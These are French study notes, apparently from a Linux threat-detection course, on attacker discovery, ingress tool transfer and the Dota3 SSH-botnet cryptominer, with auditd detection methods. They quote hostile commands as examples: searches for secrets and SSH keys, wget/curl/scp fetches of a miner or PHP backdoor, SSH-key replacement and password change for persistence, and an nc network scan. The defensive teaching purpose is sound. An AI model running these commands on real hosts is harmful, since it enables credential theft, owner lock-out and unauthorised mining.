## Discovery Overview

### Discovery

Botnets automatisent l'Initial Access → l'attaquant humain prend le relai manuellement.

![[botnet_discovery.png]]

### First Actions

Discovery skippée seulement si : cible déjà connue, ou installation rapide de cryptominer.

|Goal|Typical Commands|
|---|---|
|OS & Filesystem|`pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`|
|User & Groups|`id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`|
|Process & Network|`ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`|
|Cloud / Sandbox|`systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`|

**`whoami`** : rarement utilisé par des applis légitimes → presque toujours exécuté en premier par un attaquant. Règle de détection SOC recommandée : **alerter sur toute exécution de `whoami`**.

---

## Detecting Discovery

### Specialized Discovery

| Objective             | Typical Commands                                                       |
| --------------------- | ---------------------------------------------------------------------- |
| Credentials / secrets | `history \| grep pass`, `find / -name .env`, `find /home -name id_rsa` |
| Crypto mining recon   | `cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop`   |
| Network scan          | `ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done`    |

### Detecting Discovery

Outil : `auditd` + SIEM ou `ausearch`.

Le vrai défi = déterminer si la commande vient d'un attaquant, d'un service légitime, ou d'un admin.

![[detecting_discovery 1.png]]

**Contexte critique :**

- Red flag : un web server qui spawn `whoami`
- Red flag : un membre IT qui cherche des secrets avec `find`/`grep`
- Normal : un outil de monitoring qui ping le réseau régulièrement

**Méthode : construire un process tree avec `ausearch`**

bash

```bash
# 1. Trouver la commande suspecte et récupérer ppid
ausearch -i -x whoami
# → ppid=3898, pid=3907

# 2. Identifier le process parent
ausearch -i --pid 3898
# → /usr/bin/bash /tmp/lp.sh

# 3. Voir tous les enfants du parent (autres commandes du script)
ausearch -i --ppid 3898
# → révèle d'autres commandes malveillantes (find /home -name *secret*, etc.)
```

Remonter le process tree permet de confirmer l'origine malveillante d'une commande isolée.

---

## Motivation for Attacks

### "Hack and Forget" Attacks

Attaques à grande échelle, gains rapides. Après Discovery, 3 scénarios (cumulables) :

- **Cryptominer** : CPU/GPU de la victime mine de la crypto
- **Botnet** : enrôlement (ex. Mirai) pour DDoS
- **Proxy** : phishing, hébergement de malware, routage de trafic

### Ingress Tool Transfer

|Commande|Exemple|
|---|---|
|`wget`|`wget https://.../xmrig.tar.gz -O /tmp/miner.tar.gz`|
|`curl`|`curl --output /var/www/html/backdoor.php "https://pastebin.thm/..."`|
|`scp`|`scp kali@c2server:/home/kali/exploit.sh /tmp/exploit.sh`|

Détection selon la direction du transfert :

|Scénario|Détection|
|---|---|
|Attaquant → victime (`scp` depuis attaquant)|SSH login dans `/var/log/auth.log`|
|Victime → attaquant (`scp` depuis victime)|Commande `scp` dans les logs `auditd`|

### Additional Detection

**Network Traffic**

- IP connue malveillante (VirusTotal)
- Domaine suspect (ex. `qfpkvwgq.thm`)
- Download depuis GitHub ou service public d'outils d'attaque

**File Events**

- Nouveau fichier dans `/tmp` ou `/var/tmp`
- Nom suspect : `exploit`, `shell.php`, chaîne aléatoire

**AV / EDR** : alerte sur nouveau fichier ou process malveillant

---

## Dota3: First Actions

### Initial Access

Botnet >2000 IPs / 94 pays → scan SSH ouvert → brute-force (top 1000 passwords, cible `root`) → accès SSH humain si succès.

### Discovery

bash

```bash
# Crypto mining recon (CPU/RAM → indice fort de cryptominer)
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model

# Generic Discovery
crontab -l
w
uname -m
ls -lh $(which ls)
```

### Persistence

bash

```bash
# Changement de mot de passe (empêche les botnets concurrents)
echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash

# Remplacement des clés SSH (lock-out du propriétaire)
rm -rf .ssh && mkdir .ssh
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys  # "mdrfckr" = IoC unique
chmod -R go= ~/.ssh
```

### Detecting the Attack

|Log Source|Quoi chercher|
|---|---|
|`cat /var/log/auth.log \| grep "Accepted"`|SSH login par mot de passe depuis IP externe inconnue|
|`ausearch -i -x <command>`|Commandes Discovery (`uname`, `lscpu`…) + remonter le process tree|

IoC fort : chaîne `mdrfckr` dans `authorized_keys`.

---

## Dota3: Miner Setup

### Cryptominer Setup

Transfert via `scp` (mot de passe changé précédemment) :

bash

```bash
scp dota3.tar.gz ubuntu@victim:/tmp
```

Décompression dans un dossier caché au nom trompeur (imite des logiciels légitimes) :

bash

```bash
# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```

Exécution des binaires avec `nohup` (survie après fermeture de la session SSH) :

bash

```bash
# Scanner réseau interne (SSH port 22)
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m

# Cryptominer XMRig
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
```

|Binaire|Rôle|
|---|---|
|`tsm`|Scanner réseau (propagation SSH)|
|`initall`|XMRig cryptominer (CPU → Monero)|

### Detecting the Attack

|Source|Indicateur|
|---|---|
|Auditd|Fichiers/dossiers cachés créés dans `/tmp`|
|Auditd|Fichier nommé `dota3.tar.gz` ou similaire|
|Auditd|Exécution de `nohup`|
|Network|Scan SSH sur `192.168.*` et `172.16.*`|
|EDR|Binaire XMRig détecté (bloqué par la majorité des EDR)|

---

## Résumé — Linux Threat Detection 2

### Déroulement type d'une attaque

Botnet (Initial Access) → Attaquant humain (Discovery + actions manuelles) → Installation malware

### Discovery

Les premières commandes sont toujours les mêmes : OS, users, réseau, CPU/RAM.

`whoami` = quasi-signature d'attaquant → règle de détection SOC recommandée.

Spécialisé selon l'objectif : credentials (`find`, `grep`), crypto (`lscpu`, `free`), propagation (`ping`, `nc`).


### Détection

Outil central : `auditd` + `ausearch` pour remonter le process tree.

Le contexte prime : même commande = légitime ou malveillante selon le process parent.

### Ingress Tool Transfer

`wget`, `curl`, `scp` — loggés par auditd si exécutés depuis la victime.

Si l'attaquant envoie via `scp` depuis sa machine → pas de log auditd, seulement un login SSH dans `/var/log/auth.log`.

### Hack and Forget (Dota3)

|Phase|Actions clés|
|---|---|
|Initial Access|Brute-force SSH, cible `root`, top 1000 passwords|
|Discovery|CPU/RAM → indice cryptominer|
|Persistence|Changement de mot de passe + remplacement clés SSH (`mdrfckr`)|
|Malware|Dépôt dans `/tmp/.X26-unix/`, `nohup` pour survie post-session|
|Objectifs|Cryptominer (`initall`/XMRig) + propagation réseau (`tsm`)|

### IoC à retenir

- Chaîne `mdrfckr` dans `authorized_keys`
- Fichiers cachés dans `/tmp`
- `nohup` dans les logs
- Login SSH par password depuis IP externe inconnue
- Scan SSH sur `192.168.*` / `172.16.*`